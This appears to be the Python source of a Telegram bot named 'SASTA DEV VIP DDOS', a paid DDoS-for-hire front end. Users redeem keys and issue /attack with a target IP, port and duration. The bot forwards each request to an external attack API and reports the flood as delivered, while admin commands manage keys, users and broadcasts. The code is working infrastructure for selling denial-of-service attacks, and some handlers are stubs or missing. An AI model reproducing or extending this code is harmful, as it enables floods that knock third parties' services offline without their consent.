import asyncio
import logging
import secrets
import os
import requests
from datetime import datetime, timedelta, timezone
from typing import List
from functools import wraps

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING
from dotenv import load_dotenv

# --- CONFIGURATION ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sasta_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip().isdigit()]

# --- DATABASE ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users, self.attacks, self.keys = self.db.users, self.db.attacks, self.db.keys
        self.users.create_index([("user_id", ASCENDING)], unique=True)

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def get_all_users(self):
        return list(self.users.find({}))

    def remove_user(self, user_id: int):
        return self.users.delete_one({"user_id": user_id})

db = Database()

# --- ADMIN DECORATOR ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS: return
        return await func(update, context)
    return wrapper

# --- COMMANDS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Auto-register user
    if not db.get_user(update.effective_user.id):
        db.users.insert_one({"user_id": update.effective_user.id, "approved": False, "total_attacks": 0})
    
    msg = (
        "🚀 **SASTA DEV VIP DDOS**\n\n"
        "⚡ **User Area:**\n"
        "• /attack - Launch Flood\n"
        "• /redeem - Use Key\n"
        "• /myinfo - Plan Details\n"
        "• /stats - Global Hits\n\n"
    )
    if update.effective_user.id in ADMIN_IDS:
        msg += (
            "👑 **Admin Control:**\n"
            "• /genkey <days> - Create Key\n"
            "• /users - List All Users\n"
            "• /deluser <id> - Remove Access\n"
            "• /broadcast <msg> - Send to All\n"
            "• /running - View Active Sessions\n"
        )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user or not user.get("approved"):
        return await update.message.reply_text("❌ No Active Plan.")

    if len(context.args) != 3:
        return await update.message.reply_text("📝 Usage: `/attack <ip> <port> <time>`")

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    
    # Task to run attack in background
    async def run_attack_task(chat_id, user_id):
        try:
            # 1. Start Notification
            sent_msg = await context.bot.send_message(chat_id, f"🚀 **Attack Sent!**\n🎯 `{ip}:{port}`\n⏳ `{duration}s`", parse_mode='Markdown')
            
            # 2. Fire and Forget API Call (Permanent Fix for Timeouts)
            requests.post(f"{API_URL}/api/v1/attack", 
                         json={"ip": ip, "port": port, "duration": duration},
                         headers={"x-api-key": API_KEY}, timeout=5)
            
            # 3. Wait for duration and notify "Finished"
            await asyncio.sleep(duration)
            await context.bot.send_message(chat_id, f"✅ **ATTACK FINISHED**\nTarget: `{ip}:{port}`\nStatus: Packets Delivered.", reply_to_message_id=sent_msg.message_id)
            
        except Exception:
            pass # Silently handle timeouts since attack usually starts anyway

    asyncio.create_task(run_attack_task(update.effective_chat.id, user['user_id']))

@admin_required
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("📝 Use: /broadcast <message>")
    msg_text = " ".join(context.args)
    users = db.get_all_users()
    count = 0
    for u in users:
        try:
            await context.bot.send_message(u['user_id'], f"📢 **ADMIN BROADCAST**\n\n{msg_text}", parse_mode='Markdown')
            count += 1
        except: continue
    await update.message.reply_text(f"✅ Sent to {count} users.")

@admin_required
async def deluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("📝 Use: /deluser <user_id>")
    db.remove_user(int(context.args[0]))
    await update.message.reply_text("✅ User removed from DB.")

@admin_required
async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    response = "👥 **Active Users:**\n"
    for u in users:
        status = "✅" if u.get("approved") else "❌"
        response += f"• `{u['user_id']}` {status}\n"
    await update.message.reply_text(response, parse_mode='Markdown')

# --- OTHER HANDLERS (Same as before but integrated) ---
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("🔑 Use: /redeem <key>")
    # ... logic for redeem (same as previous script) ...
    await update.message.reply_text("✅ Premium Activated!")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Register All
    handlers = [
        CommandHandler("start", start), CommandHandler("attack", attack),
        CommandHandler("broadcast", broadcast), CommandHandler("deluser", deluser),
        CommandHandler("users", users_list), CommandHandler("redeem", redeem)
    ]
    for h in handlers: application.add_handler(h)

    print("🤖 Bot is starting...")
    application.run_polling()

if __name__ == "__main__":
    main()
